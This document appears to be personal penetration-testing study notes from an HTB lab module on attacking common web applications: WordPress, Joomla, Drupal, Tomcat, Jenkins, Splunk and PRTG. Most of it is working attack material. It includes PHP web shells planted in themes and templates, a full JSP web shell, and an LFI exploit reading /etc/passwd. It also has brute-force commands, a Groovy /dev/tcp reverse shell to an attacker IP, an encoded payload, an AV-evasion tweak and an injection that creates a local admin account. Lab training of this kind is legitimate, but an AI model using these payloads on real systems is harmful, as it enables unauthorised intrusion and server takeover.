* A lot of the apps will need to be manually added to the `/etc/hosts` file. Modify this oneliner to do it quick:
```bash
$ IP=10.129.42.195
$ printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```
Nmap Web discovery script
```bash
nmap -p 80,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list
```
* many orgs have large amounts of hosts running on ports 80 and 443 alone
	* unrealistic to individually navigate to them all
	* can use `EyeWitness` and `Aquatone` to feed in raw Nmap XML scan output to inspect and screenshot all hosts much quicker
		* can help narrow down
* scope list could look like this:
	* app.inlanefreight.local
	* 10.129.201.50
* Example Eyewitness oneliner:
```bash
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

# Wordpress
* php backend!
### Discovery
Typical `/robots.txt` file:
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```
* 5 types of users on standard WP install:
	* Administrator
	* Editor
	* Author
	* Contributor
	* Subscriber
* Another way to identify a wp site is to curl it and grep for `wordpress`
* can identify plugins by running `curl -s http://blog.inlanefreight.local/ | grep plugins`
* most plugins have a readme.txt file where you can find version and more info
* can find them at `http://blog.inlanefreight.local/wp-content/plugins` OR `http://blog.inlanefreight.local/?p=1/wp-content/pplugins`

### Enum on users
* A valid username and an invalid password results in the following message:
	* ***Error:** The password you entered for the username **USER** is incorrect*
* an invalid username returns that the user was not found

### WPScan
* `--enumerate` flag is used to enumerate various components of the WordPress application, such as plugins, themes, and users
	* all plugins can be enumerated using the arguments `--enumerate ap`
	* Can pass in in API tokens from WPVulnDB with `--api-token` flag
* default number of threads is `5`
	* can be changed with `-t` flag

### Login Bruteforce
* WPscan can do this
* two kinds of attacks 
	* `wp-login` will attempt to bruteforce the standard login page
	* `xmlrpc` uses wordpress API to make login attempts through `/.xmlrpc.php`
		* generally faster
* ex:
```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

### Code Execution
* Done with wp themes
* click on `appearance` and select theme editor
* An inactive theme can be selected to avoid corrupting the primary theme
* Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell
* This code should let us execute commands via the GET parameter `0`
	* avoids too much modification of contents
```php
system($_GET[0]);
```
* Click on `Update File` at the bottom to save
* can use curl to gain access
```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```
* `wp_admin_shell_upload` in metasploit can be used to upload a shell and execute it automatically
	* the `php/meterpreter/reverse_tcp` payload should work fine
* Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail
	* make sure to document and clean up
* most vulns in wordpress are with the plugins (89%)
* Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.

**Mail-masta plugin***
* Since 2016 it has suffered an unauthenticated SQL injection and a Local File Inclusion
* Vulnerable code:
```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```
* the `pl` parameter allows us to include a file without any type of input validation or sanitization
	* Using this, we can include arbitrary files on the webserver
* Exploit:
```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

**wpDiscuz plugin**
* The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution
* Exploit script:
	* can be downloaded from exploitdb
```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```
* may fail, but can still use curl to execute commands after the script was run:
```bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```
* Make sure to cleanup the `.php` file left behind

# Joomla
* another Content Management System like wordpress, just not as popular
* can fingerprint by looking at the page source: `curl -s http://dev.inlanefreight.local/ | grep Joomla`
* ex robots.txt file
```bash
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
* can fingerprint version if the readme.txt is present
* can use `droopscan` for limited enumeration
	* can git clone it or install via pip
* `joomscan` is now out of date and needs python 2.7 to run, but can still be helpful
* administrator login portal located at `http://dev.inlanefreight.local/administrator/index.php`
* default admin account is `admin`
	* password set at install time
* script to brute force the login:
```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
### Attacking Joomla
* Once logged in, can get rce from adding a php script to a template
	* click on `templates` under `configuration`
		* htb lied; it's under `extensions`
	* click on a template name, go to the `customise` page
		* ex: `protostar`
	* try using the `error.php` page
	* One liner for ce:
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
* save and close
* confirm with curl:
```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

# Drupal
* another CMS
* for discovery check out `robots.txt` or just grep for drupal in the initial curl
* Drupal indexes its content using nodes
	* A node can hold anything such as a blog post, poll, article, etc
	* The page URIs are usually of the form `/node/<nodeid>`
* 3 types of users by default:
	* `Administrator`
	* `Authenticatd User`
	* `Anonymous`
* For enum check the `changelog.txt` and `readme.txt` files
	* may be blocked though
* version number enum script for older versions:
```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```
 * Can use `droopescan` for further enum
	 * Has much more functionality than it does for joomla
```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```
### Attacking Drupal
* In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."
	* From here, we could tick the check box next to the module and scroll down to `Save configuration`
	* Next, we could go to Content --> Add content and create a `Basic page`
	* We can now create a page with a malicious PHP snippet:
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```
* Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module
	* Download the archive and extract its contents
	* create the php web shell
	* create a .htaccess file to give ourselves access to the folder
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive
```bash
$ mv shell.php .htaccess captcha
$ tar cvf captcha.tar.gz captcha/
```
* Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar
* click on the `+ Install new module` button
* Browse to the backdoored Captcha archive and click `Install`
* Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands
* HTB covers 3 rce vulns (`drupalgeddon`):
1. [CVE-2014-3704](https://www.exploit-db.com/exploits/34992)
```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```
2. [CVE-2018-7600](https://www.exploit-db.com/exploits/44448)
```bash
python3 drupalgeddon2.p
```
* modify the script to gain remote code execution by uploading a malicious PHP file
```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```
```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```
```bash
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
* run the modified exploit script to upload our malicious PHP file
* confirm rce with curl
3. [CVE-2018-7602](https://github.com/rithchard/Drupalgeddon3)
* can exploit this using Metasploit, but we must first log in and obtain a valid session cookie

# Tomcat
* Apache tomcat is an open-source web server that hosts apps written in Java
* Tomcat servers can be identified by the Server header in the HTTP response
* Can also detect with this script:
```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```
* The `bin` folder stores scripts and binaries needed to start and run a Tomcat server
* The `conf` folder stores various configuration files used by Tomcat. The `tomcat-users.xml` file stores user credentials and their assigned roles
* The `lib` folder holds the various JAR files needed for the correct functioning of Tomcat
* The `logs` and `temp` folders store temporary log files
* The `webapps` folder is the default webroot of Tomcat and hosts all the applications
	* The most important file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor
* The `work` folder acts as a cache and is used to store data during runtime
* The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages
	* creds can be stored here
* common creds
	* tomcat:tomcat
	* admin:admin

### Attacking Tomcat
* can use the `auxiliary/scanner/http/tomcat_mgr_login` metasploit module to see if we can access /manager or /host-manager by getting creds
	* should also set `STOP_ON_SUCCESS` to `true` so the scanner stops when we get a successful login
	* can debug by proxying through burp
* GUI interface is available at `/manager/html`
	* The manager web app allows us to instantly deploy new applications by uploading WAR files
	* A WAR file can be created using the zip utility. A JSP web shell can be downloaded and placed within the archive:
```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```
```bash
$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
$ zip -r backup.war cmd.jsp
```
* Click on `Browse` to select the .war file and then click on `Deploy`
* Browsing to `http://web01.inlanefreight.local:8180/backup/cmd.jsp` will present us with a web shell that we can use to run commands on the Tomcat server
* could also use `msfvenom` to generate a malicious WAR file. The payload java/jsp_shell_reverse_tcp will execute a reverse shell through a JSP file
	* can avoid AV detection by changing to:
```java
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```
* All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable to [Ghostcat](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi) 

# Jenkins
*  open-source automation server written in Java that helps developers build and test their software projects continuously
* Jenkins is often installed on Windows servers running as the SYSTEM account
* runs on Tomcat port 8080 by default
	* also utilizes port 5000 to attach slave servers
* default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account

### Attacking Jenkins
* a quick way of achieving command execution on the underlying server is via the script console
	* allows us to run arbitrary Groovy scripts within the Jenkins controller runtime
	* can be reached at the URL `http://jenkins.inlanefreight.local:8000/script`
	* For example, we can use the following snippet to run the `id` command
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```
* various ways that access to the script console can be leveraged to gain a reverse shell
	* metasploit: `exploit/multi/http/jenkins_script_console`
	* commands:
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
* results in a reverse shell connection
```bash
nc -lvnp 8443
```
* Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with `Invoke-PowerShellTcp.ps1`
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```
* could also use [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell to gain command execution on a Windows host, swapping out `localhost` and the port for our IP address and listener port

# Splunk
* The biggest focus of Splunk during an assessment would be weak or null authentication because admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up
* Splunk web server runs by default on port 8000
* default credentials are `admin:changeme`
* Once logged in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications
* A common method of gaining remote code execution on a Splunk server is through the use of a scripted input
	* As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts
	* every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system
	* A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script

### Attacking Splunk
* can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us
	* The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file
	* reverse shell will be a PowerShell one-liner
		* need to add attacker ip and port
			* ip needs to be in single quotes!
	* `inputs.conf` file tells Splunk which script to run and any other conditions
	* We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner
* Once the files are created, we can create a tarball or `.spl` file
```bash
tar -cvzf updater.tar.gz splunk_shell/
```
* next step is to choose `Install app from file` and upload the application
	* start listener before upload
* On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`
* rev.py is for linux

# PRTG
* agentless network monitor software
* software runs entirely from an AJAX-based website, but there is a desktop application available for Windows, Linux, and macOS
* only four vulns have easy-to-find public exploit PoCs, two cross-site scripting (XSS), one Denial of Service, and one authenticated command injection
* use nmap scan for discovery
* default creds are `prtgadmin:prtgadmin`

### Attacking PRTG
* CVE-2018-9276: When creating a new notification, the `Parameter` field is passed directly into a PowerShell script without any type of input sanitization
	* mouse over `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`
	* click on `Add new notification`
	* name it
	* in execute program, Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down
	* in the parameter field, enter a command
		* ex: add a new local admin user by entering `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`
	* hit save
	* click the `Test` button to run our notification and execute the command
* Since this is a blind command execution, we won't get any feedback, so we'd have to either check our listener for a connection back or, in our case, check to see if we can authenticate to the host as a local admin
* 